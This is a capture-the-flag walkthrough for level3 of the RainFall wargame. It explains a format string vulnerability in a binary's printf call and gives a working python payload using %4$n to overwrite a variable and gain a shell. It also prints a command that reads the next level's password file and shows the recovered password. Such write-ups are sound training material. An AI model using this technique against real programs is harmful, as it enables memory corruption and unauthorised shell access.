@@ -1,0 +1,41 @@
+In this level, there is still an input interaction but this time secure: fgets
+
+The flaw that is here is called: Format string attack
+The program launches a shell if the variable m = 64.
+
+To do this, we will use the printf() function which does not check the format specifiers provided by the user, which allows us to exploit a format string vulnerability to read or write to memory.
+
+The first step is to find where in the stack the input value is located.
+
+./level3
+XXX %x %x %x %x %x
+XXX 200 b7fd1ac0 b7ff37d0 20585858 25207825
+
+58 = X
+585858 = X
+So he is in 4th position.
+
+level3@RainFall:~$ ./level3
+
+Thanks to GDB, we can find the memory address of M : 
+
+   0x080484da <+54>:	mov    0x804988c,%eax
+   0x080484df <+59>:	cmp    $0x40,%eax
+   0x080484e2 <+62>:	jne    0x8048518 <v+116>
+0x804988c is the address memory of M
+
+All we have to do now is make our payload.
+Our address is 4 bytes long, all that remains is to complete it with 60 other bytes.
+We create our payload using %4$n, which writes the number of characters printed so far to the 4th address on the stack. This allows memory manipulation by controlling the address where this number will be stored, thus exploiting a format string vulnerability.
+
+(python -c 'print "\x8c\x98\x04\x08" + "X" * 60 + "%4$n"' ; cat) | ./level3
+
+level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "X" * 60 + "%4$n"' ; cat) | ./level3
+?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+
+
+Helpfull 
+https://hackinglab.cz/en/blog/format-string-vulnerability/
